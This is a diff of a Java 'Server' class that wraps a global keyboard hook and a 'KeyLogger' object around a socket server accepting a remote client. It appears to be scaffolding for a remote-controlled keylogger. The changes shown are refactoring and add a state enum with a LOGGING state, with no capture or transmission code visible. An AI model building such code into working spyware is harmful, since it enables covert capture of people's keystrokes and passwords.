@@ -8,28 +8,29 @@ import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.GlobalScreen;
 
 public class Server {
+    public static enum State {
+        RUNNING,
+        LOGGING,
+        STOP
+    };
     private ServerSocket serverSock;
     private Socket clientSock;
     private InputStream inputStream;
     private OutputStream outputStream;
     private KeyLogger keyLogger;
+    private State state;
 
     public Server(int port, int backlog) {
         createServerSocket(port, backlog);
         keyLogger = new KeyLogger();
+        state = State.RUNNING;
     }
 
-    private void createServerSocket(int port, int backlog) {
-        try {
-            serverSock = new ServerSocket(port, backlog);
-        }
-        catch (IOException e) {
-            e.printStackTrace();
-        }
-
+    public State getState() {
+        return state;
     }
 
-    private void acceptClient() {
+    public void acceptClient() {
         try {
             clientSock = serverSock.accept();
             inputStream = clientSock.getInputStream();
@@ -39,6 +40,16 @@ public class Server {
             e.printStackTrace();
         }
     }
+
+    private void createServerSocket(int port, int backlog) {
+        try {
+            serverSock = new ServerSocket(port, backlog);
+        }
+        catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
 
     // public static void main(String[] args) {
     //     try {
